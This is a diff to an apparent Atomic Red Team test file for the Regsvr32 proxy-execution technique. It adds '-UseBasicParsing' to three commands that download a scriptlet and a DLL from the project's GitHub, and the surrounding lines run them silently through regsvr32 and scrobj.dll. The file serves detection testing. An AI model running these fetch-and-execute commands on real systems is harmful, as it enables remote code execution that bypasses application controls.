@@ -28,7 +28,7 @@ atomic_tests:
       if (Test-Path "#{filename}") {exit 0} else {exit 1}
     get_prereq_command: |
       New-Item -Type Directory (split-path "#{filename}") -ErrorAction ignore | Out-Null
-      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.010/src/RegSvr32.sct" -OutFile "#{filename}"
+      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.010/src/RegSvr32.sct" -OutFile "#{filename}" -UseBasicParsing
   executor:
     command: |
       #{regsvr32path}\#{regsvr32name} /s /u /i:"#{filename}" scrobj.dll
@@ -86,7 +86,7 @@ atomic_tests:
       if (Test-Path "#{dll_name}") {exit 0} else {exit 1}
     get_prereq_command: |
       New-Item -Type Directory (split-path "#{dll_name}") -ErrorAction ignore | Out-Null
-      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.010/bin/AllTheThingsx86.dll" -OutFile "#{dll_name}"
+      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.010/bin/AllTheThingsx86.dll" -OutFile "#{dll_name}" -UseBasicParsing
   executor:
     command: |
       IF "%PROCESSOR_ARCHITECTURE%"=="AMD64" (C:\Windows\syswow64\regsvr32.exe /s #{dll_name}) ELSE ( #{regsvr32path}\#{regsvr32name} /s #{dll_name} )
@@ -154,7 +154,7 @@ atomic_tests:
       if (Test-Path "#{dll_name}") {exit 0} else {exit 1}
     get_prereq_command: |-
       New-Item -Type Directory (split-path "#{dll_name}") -ErrorAction ignore | Out-Null
-      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.010/bin/AllTheThingsx86.dll" -OutFile "#{dll_name}"
+      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.010/bin/AllTheThingsx86.dll" -OutFile "#{dll_name}" -UseBasicParsing
   executor:
     command: |
       #{regsvr32path}\#{regsvr32name} /s /i "#{dll_name}"
